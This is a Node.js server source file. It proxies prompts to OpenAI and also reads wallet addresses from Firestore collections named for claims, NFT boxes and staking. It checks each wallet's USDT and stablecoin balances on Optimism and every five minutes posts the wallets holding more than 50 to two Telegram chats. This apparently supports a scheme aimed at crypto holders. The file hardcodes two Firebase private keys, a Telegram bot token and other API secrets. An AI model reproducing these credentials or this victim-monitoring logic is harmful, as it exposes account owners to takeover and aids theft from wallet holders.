import express from 'express'
import * as dotenv from 'dotenv'
import cors from 'cors'
import { Configuration, OpenAIApi } from 'openai'
// const http = require("http");
import * as http from 'http';
// const { Telegraf } = require("telegraf");
import { Telegraf } from 'telegraf';
// const Web3 = require("web3");
import Web3 from 'web3';
import admin from 'firebase-admin';

import {getFirestore} from 'firebase-admin/firestore';
let serviceAccount = {
    "type": "service_account",
    "project_id": "dataaddress-913bb",
    "private_key_id": "17db97c3bbdbf2421f306f3cf40da35065954887",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC0IHXgdP2aMviE\n2PwCb0LuoaJ5J3vNT6GE1iZnNOuhvZrkvA/vF+VsK3vhE00f/MIU7O4Mba1h4rfc\nppHt3DQ967KJYnmoGU1YImUKUQJ/kVr+PtMNFY4zoV5MN5qlKbdabC9L8lk+emHX\n4/SdHxAhWlqAKaU/JuKHvOEi1AF1jCFAFiYupdpTdidki2AXpjly/w9sxhG4N/+a\n5XoZ9CGeRDhZxXxA4dCqEevh+w2UJmr5CkKltKU0cSj0HgqB1PGikLkxaU7GbetN\nzeHC51yZv7TF8I2e2rNVWmxx/hn6wV+l89YI8pKoovnx9NA2lh09z5mQ9eaD+dQw\n8twIVeTbAgMBAAECggEAAK5YKptyDuBoUNn7vfCdUquCNPcz5NdUTl0yV9TWdmBN\ngIybeoeV9Pmrr04Y4HtMYWm7Dq346DQx4ekLmcXXb93s6RjHt/kOzZclajk2nY/b\n6kksGBtbHTYlMXvdMXY92CgtRVEGU8jJ9Oo4gwtIPIt5jWha5s25VWUMft0AMmlb\nq0utT6sYDEhcvxNxGe/DHgIMzr38ShdAokzn72+HReUJBnHT3AmCHSJKIYe1M7ox\n5uNqo0v9vqGw562V7JuWCmCUuHV352fsSRULqgaBECKsFxiAdUtFAaWSFxNzm6Gb\nz0C+32YzEpvTcEWAqdFlMAX8yFXCUQoPuZC4DaUFQQKBgQDb9OUsigOxYKBQklAu\ndNM5qOYMEJhIi37ywXBTMUhl/DlBvR9U3TQvv/py+PxUkyTzNqhhALjc3mA89rzR\nBk0qEc0nXNIn3BkcTrtzmhcSPJR2/RWPligmvOi4695epGJWW3Jmv2UKzysYe9Pv\njz63J06JLT8O6ydusHTN1yiumwKBgQDRpLfDyKuakzbHF7NfcRQuAIjIr2nlupcX\nylyhIcDFTlWUoYYuUYNom77wIVIYHu0KTo/UXK1eKe2u37kodQaOaTsqnzAgVGh2\nSaInGAkYoOR1cgys69RCS4rXrib+xooe6KsS5GCLOIyRljeGzrArk9nk4qzL/3OE\nN8mAIJHmwQKBgQDaR0yKh6gkhbxyWNCjWaIoTVmGTY2iKHTh2V9r37N2Kfh0KYeH\nQ0G/xSd4o2hdUezQQ8STBxFtdm1Q8pbsY/F9t069KlsP3Vc6BVP248rTeTToZD3a\nUWwlDUFyCfiSOVWxV2zPVE6kjHS7Bl+LE79sKODCNxml520pZolzoHqp0wKBgCLV\nFHdiOyj2ts5DoNkFx82Q5yk5BAZYh0w7okJfglEGH/APGmVNw+C4p/PsBWDempHw\n1bL6JxATNVut7mzLbOhykZMWWf+1Jpoox9lpA/HkobDl3zdIA790H8CQPghs4nwa\nOnpsGaJoJer2o4kxhFHpQfXmt8E5U28vebphLvzBAoGBAJsm7DMthRv9F+XxNnno\nK07xFyPaDbTyEM3zbQaeClZIg24qFA+//zSwBYger6uhHhpmDXOpsew3AAc41x12\ntUPaAlfedH8KfCLcWQbvSpuGxM9wBxLnNbqt5YlzLI3z9IHETMAB4mLZ7zPm66xN\nO7QD8eYga7R+VoR+aONt1Ieo\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-vdbmd@dataaddress-913bb.iam.gserviceaccount.com",
    "client_id": "112913805816820759948",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-vdbmd%40dataaddress-913bb.iam.gserviceaccount.com"
  }
  let serviceAccountOld={
    "type": "service_account",
    "project_id": "memetoken-caca7",
    "private_key_id": "86b9a54678ca7ee39e9af1d99c844df21c2cd560",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCvTld/8zxkwSlo\noIqf9qpsbIkZJY1sQzhYxRoFnPmD4rlWgNKnImMao1gj+6IUiw1ZEQTm6Ata4DHz\n+3w1oW5Y52J6OdeJSOruv71WnV4rwrbYJOb/sHHGrYopeGOg3B1HiWofKOcrtrW+\nx3Qr955RM+qQN0ZXrbTRNsC25OX+WoMoOOZwRj3Den7cdFNGDUqe+jC8xA1CZzAk\n3egUwkmk1JKAK1v222ObrOf7gl0Gg04vYgsAHdE3+bv46p1CF+MNx8OSCbTvm62k\n0/2E5h5QVt/fAvoiRIgvPBul1syd2rZrAhk9L5mDvQfPZIrMwGzAJhdH4RX/xqQn\nZUe4KL6HAgMBAAECggEAALeWNmGC/Rzgpl+vKDpP9jd2bgso0X+jh4UDmOU2A6Nb\nj+nKqdUfapOTslnqlZXt938WxjYYdtk9m1p96xqz1zN1AwQGUFGka+Zu88FKVFbQ\nkSSdbs7G3Co27P5PoxPZnPQIMPR+WHpI1t+Bz/PGvmqYHqPyH5bEr1smyDr/7CRm\nLtXT9jeg/Rp57xQshX/pju7WxJxxJ15X2efCX1M8+A5JJxMTFGGMtQVwtLdlOTFI\naCN3gFClJrdNgIKeBm9LfXAleDm3OKNJ7k8sjvQj7jpdiSUijJQQ+1RLrQoMnviN\nchVPilzH24hLdGYFrsL4hIG1djMeU4loiv9EyIzGwQKBgQDtvUTzE7b/+rLy9bBX\n9w1V9eaJlQMR7xlCX0a2jhhLIjywdPhgzqkkR90W5BckTTHXCqUCMAEXTxixhhPd\ny0m6ShEhV9b9J5oPCNe3aSTWcgSYRzrAwnXsndaqHJzPdkKBRRcYW4b3/V855okI\nuTqNLM5bIVFdr2Lvi48DZ5SqwQKBgQC8xW4RScTgy/ZbzaJ7W0AUDRormsrQTVw5\n+aj8viR/yqUAg/vlEdWOezK00rz9ApyjemVyF3Ix8Df4OYym/VSZ5XkbYGiz6LBW\nv7fmbnJ2f51UUI5TuzTFztjJTuOv8Nu7Y3bImrlzGTbCO6TpCGdX/ukiERV0KPCd\n2U4YmNUjRwKBgBdnrsYPhtCkqcFplrbSR6nSz6Nz3B2D4IS8RIXsb0/WSwtEOL+v\nGM/Nk2KRigW049c74QraFwFodBHmFUacoOGKMS2LLEs3/t7EDBiubUX/a5xiRtJ7\nUoi88UlGD9oM1ndLif6H5D294AYfQBZvxefoJVirawtCHQdgQfAf3m8BAoGAPvlC\nAcRxSGjic7fC95H2a3n/fAJ0nE7icHjIFiC8fmE08FoXY1CyxIh23vnakDEZ3jOL\nuib2MpCnq0hPkrm6SmjSIP7ljvcWNKpaiCXaS4vBCYqiIG64aTDbAzUtIdmhA/9n\ndf6f1TTZHqzVE+R4zVM9pN68IHcz5gTDV9NMbysCgYAuxpDH+G6ooJuS46dyfI1v\nnGgWf1GQeVvvdtwmjlStj4iYeqKxcfXMOreO0sFYKWxqljGjGBgTTarD0e0IUvDh\nScmjxalCHhXLbTmsP/SOF2FBpDJOPcwB1Zrf1rgewe/VqQTIL9DAi/7STKytO6Xu\nALNM/v2G/QSO41RYH2OjZQ==\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-s52qf@memetoken-caca7.iam.gserviceaccount.com",
    "client_id": "113474334425755926984",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-s52qf%40memetoken-caca7.iam.gserviceaccount.com"
  }
dotenv.config()

const configuration = new Configuration({
  organization: "org-E3EcUqTzV7Eh6T7A2pIUcEIm",
  apiKey: process.env.OPENAI_API_KEY,
});

const openai = new OpenAIApi(configuration);

const app = express()
app.use(cors())
app.use(express.json())

app.get('/', async (req, res) => {
  res.status(200).send({
    message: 'Hello from ChatGPT!'
  })
})

app.post('/', async (req, res) => {
  try {
    const prompt = req.body.prompt;

    const response = await openai.createCompletion({
      model: "text-davinci-003",
      prompt: `${prompt}`,
      temperature: 0, // Higher values means the model will take more risks.
      max_tokens: 3000, // The maximum number of tokens to generate in the completion. Most models have a context length of 2048 tokens (except for the newest models, which support 4096).
      top_p: 1, // alternative to sampling with temperature, called nucleus sampling
      frequency_penalty: 0.5, // Number between -2.0 and 2.0. Positive values penalize new tokens based on their existing frequency in the text so far, decreasing the model's likelihood to repeat the same line verbatim.
      presence_penalty: 0, // Number between -2.0 and 2.0. Positive values penalize new tokens based on whether they appear in the text so far, increasing the model's likelihood to talk about new topics.
    });

    res.status(200).send({
      bot: response.data.choices[0].text
    });

  } catch (error) {
    console.error(error)
    res.status(500).send(error || 'Something went wrong');
  }
})
const usdt_abi = [
    {
      inputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "spender",
          type: "address",
        },
        {
          indexed: false,
          internalType: "uint256",
          name: "value",
          type: "uint256",
        },
      ],
      name: "Approval",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "previousOwner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "newOwner",
          type: "address",
        },
      ],
      name: "OwnershipTransferred",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          indexed: false,
          internalType: "uint256",
          name: "value",
          type: "uint256",
        },
      ],
      name: "Transfer",
      type: "event",
    },
    {
      constant: true,
      inputs: [],
      name: "_decimals",
      outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "_name",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "_symbol",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [
        { internalType: "address", name: "owner", type: "address" },
        { internalType: "address", name: "spender", type: "address" },
      ],
      name: "allowance",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { internalType: "address", name: "spender", type: "address" },
        { internalType: "uint256", name: "amount", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [{ internalType: "address", name: "account", type: "address" }],
      name: "balanceOf",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
      name: "burn",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "decimals",
      outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { internalType: "address", name: "spender", type: "address" },
        {
          internalType: "uint256",
          name: "subtractedValue",
          type: "uint256",
        },
      ],
      name: "decreaseAllowance",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "getOwner",
      outputs: [{ internalType: "address", name: "", type: "address" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { internalType: "address", name: "spender", type: "address" },
        { internalType: "uint256", name: "addedValue", type: "uint256" },
      ],
      name: "increaseAllowance",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
      name: "mint",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "name",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "owner",
      outputs: [{ internalType: "address", name: "", type: "address" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [],
      name: "renounceOwnership",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "symbol",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "totalSupply",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { internalType: "address", name: "recipient", type: "address" },
        { internalType: "uint256", name: "amount", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { internalType: "address", name: "sender", type: "address" },
        { internalType: "address", name: "recipient", type: "address" },
        { internalType: "uint256", name: "amount", type: "uint256" },
      ],
      name: "transferFrom",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ internalType: "address", name: "newOwner", type: "address" }],
      name: "transferOwnership",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
  ];
  
  var busd_contract_ad_bsc = "0x7F5c764cBc14f9669B88837ca1490cCa17c31607";
  
  var usdt_contract_ad_bsc = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58";

  

  
  
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
  });
  
  const db = getFirestore();
  async function getFirebase(nameFireStore) {
    const snapshot = await db.collection(nameFireStore).get();
  
    snapshot.forEach((doc) => {
      // console.log(doc.id, "=>", doc.data());
      return doc.data();
    });
    return snapshot.docs.map((doc) => doc.data());
  }
  async function getData() {
  
    let arrRun = await getFirebase("ADDRESSIDOOP");
    let arrRunBox = await getFirebase("ADDRESSNFTOP");
    let stakeNFT = await getFirebase("StakeNFTOP");
    let claimOP = await getFirebase("ADDRESSClaimOP");
    let newarr = await arrRun.concat(arrRunBox).concat(stakeNFT).concat(claimOP)
  
    return await showAll(newarr)
  
  }
  let done = false
  
  async function showAll(data) {
  
    let add = data ? data : [];
    // add.map((e) => {
    //   showAmountNew(e.Address);
    // });
    let tasks = []
    for (const e of add) {
  
      let task = async () => {
        const a = await showAmountNew(e.Address);
        return a
      }
  
      tasks.push(task())
  
  
    }
    const data1 = await Promise.all(tasks)
    return data1
  
  }
  
  async function showAmountNew(address) {
    let listAmount = []
    const serverUrl =
      "https://optimism-mainnet.gateway.pokt.network/v1/lb/62eb567f0fd618003965da18";
    const appId = "FJ21OtD53RTJ3yKormpVOHwsP5JVMR6RBfMnLVwI";
    const moralisSecret = "JjAbZblolwJd52r";
    let valueBUSD, valueUSDT;
  
    let _web3 = new Web3(new Web3.providers.HttpProvider(serverUrl));
    const usdt_contract_bsc = new _web3.eth.Contract(
      usdt_abi,
      usdt_contract_ad_bsc
    );
  
  
    const busd_contract_bsc = new _web3.eth.Contract(
      usdt_abi,
      busd_contract_ad_bsc
    );
  
    valueBUSD =
      (await busd_contract_bsc.methods.balanceOf(address).call()) / 1e6;
    valueUSDT =
      (await usdt_contract_bsc.methods.balanceOf(address).call()) / 1e6;
    let amount = parseInt(valueBUSD) + parseInt(valueUSDT)
    let subS = address.slice(37, 42)
    return { add: subS, BUSD: parseInt(valueBUSD), USDT: parseInt(valueUSDT) }
  
  
  }
  
  async function showBUSD(address) {
    const serverUrl =
      "https://optimism-mainnet.gateway.pokt.network/v1/lb/62eb567f0fd618003965da18";
    const appId = "FJ21OtD53RTJ3yKormpVOHwsP5JVMR6RBfMnLVwI";
    const moralisSecret = "JjAbZblolwJd52r";
    let valueBUSD;
  
    let _web3 = new Web3(new Web3.providers.HttpProvider(serverUrl));
    const busd_contract_bsc = new _web3.eth.Contract(
      usdt_abi,
      busd_contract_ad_bsc
    );
  
    valueBUSD =
      (await busd_contract_bsc.methods.balanceOf(address).call()) / 1e6;
  
    return valueBUSD;
  }
  async function showUSDT(address) {
    const serverUrl =
      "https://optimism-mainnet.gateway.pokt.network/v1/lb/62eb567f0fd618003965da18";
  
    let valueUSDT;
  
    let _web3 = new Web3(new Web3.providers.HttpProvider(serverUrl));
    const usdt_contract_bsc = new _web3.eth.Contract(
      usdt_abi,
      usdt_contract_ad_bsc
    );
  
    valueUSDT =
      (await usdt_contract_bsc.methods.balanceOf(address).call()) / 1e6;
  
    return valueUSDT;
  }
  async function showListBUSD(data) {
    let listBUSD = [];
    const serverUrl =
      "https://optimism-mainnet.gateway.pokt.network/v1/lb/62eb567f0fd618003965da18";
    const appId = "FJ21OtD53RTJ3yKormpVOHwsP5JVMR6RBfMnLVwI";
    const moralisSecret = "JjAbZblolwJd52r";
    let _web3 = new Web3(new Web3.providers.HttpProvider(serverUrl));
    const busd_contract_bsc = new _web3.eth.Contract(
      usdt_abi,
      busd_contract_ad_bsc
    );
    for (let index = 0; index < data.length; index++) {
      const element = data[index].Address;
      let valueBUSD =
        (await busd_contract_bsc.methods.balanceOf(element).call()) / 1e6;
      listBUSD.push(valueBUSD);
  
  
    }
    console.log(listBUSD);
  }

  
app.listen(5000,async () => {
    const bot = new Telegraf("5116302131:AAEE3beyoMrRoj_CHR8uXFN6E_Eorz_1Ok0", {
        polling: true,
      });
      bot.launch();
      const sendMessage = async () => {
    
    
    
   
      let data = await getData()
        // let amountAdd = await data.length
        // console.log(amountAdd);
    
      let newData = await data.filter(function (el) {
          return el.BUSD > 50 || el.USDT > 50;
        });
    
       senData(newData)
        
      function senData(data) {
        
        
 
        let res = JSON.stringify(data)
        bot.telegram.sendMessage("378761979", res);
        //main
        bot.telegram.sendMessage("1954760742", res);
      }
    
      };
    
      sendMessage();
    
      setInterval(() => {
        sendMessage();
      }, 5 * 60 * 1000);
})